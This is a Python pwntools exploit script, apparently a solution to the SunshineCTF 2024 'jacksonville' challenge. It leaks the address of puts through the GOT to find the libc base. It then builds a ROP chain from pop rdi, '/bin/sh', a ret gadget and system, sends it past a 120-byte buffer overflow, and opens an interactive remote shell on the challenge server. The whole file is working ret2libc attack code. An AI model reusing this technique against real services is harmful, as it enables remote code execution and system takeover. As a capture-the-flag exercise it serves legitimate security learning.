from pwn import *

#Establish the target, and the binaries
HOST = "2024.sunshinectf.games"
PORT = 24608
target = remote(HOST, PORT)
binary = context.binary = ELF("../../publish/i95/i95-jacksonville/jacksonville")
libc = ELF("../../publish/i95/i95-jacksonville/libc.so.6")

# Wrapper functions for IO

def bug(payload: bytes):
    target.recvline()
    target.sendline(b"1")
    target.sendline(payload)


def leak(val: int):
    target.recvline()
    target.sendline(b"0")
    target.sendline(bytes(str(val), "utf-8"))
    target.recvline()
    leak = target.recvline().replace(b"\n", b"")
    leak_val = int(leak, 16)
    return leak_val

# First get a libc infoleak, and calculate libc base
puts_leak = leak(binary.got["puts"])
libc_base = puts_leak - libc.symbols["puts"]

libc.address = libc_base
rop = ROP(libc)

# Calculate needed libc addresses
pop_rdi = rop.rdi[0] #libc_base + 0x28795
binsh = next(libc.search(b'/bin/sh\x00')) #libc_base + 0x1c041b
system = libc.sym['system'] #libc_base + libc.symbols["system"]
ret = rop.ret[0] #libc_base + 0x26a3e

info("puts: " + hex(puts_leak))
info("libc base: " + hex(libc_base))
info("pop rdi: " + hex(pop_rdi))
info("binsh: " + hex(binsh))
info("ret: " + hex(ret))
info("system: " + hex(system))


# Crate the payload to call system("/bin/sh")
# We need an extra ret gadget in there, for stack alignment
# Otherwise we just crash in the middle of system
ROP_CHAIN = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)

payload = b"0"*120 + ROP_CHAIN

# Send the Payload
bug(payload)

target.recvline()
# Drop to an interactive shell!
target.interactive()

